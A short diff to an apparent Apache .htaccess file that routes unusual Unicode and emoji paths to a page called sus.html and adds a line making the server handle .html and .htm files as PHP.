@@ -4,3 +4,5 @@ RewriteRule ^sus$ sus.html [NC]
 RewriteRule ^／$ sus.html [NC]
 RewriteRule ^／᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼sus$ sus.html [NC]
 RewriteRule ^🆘$ sus.html [NC]
+
+AddType application/x-httpd-php .html .htm
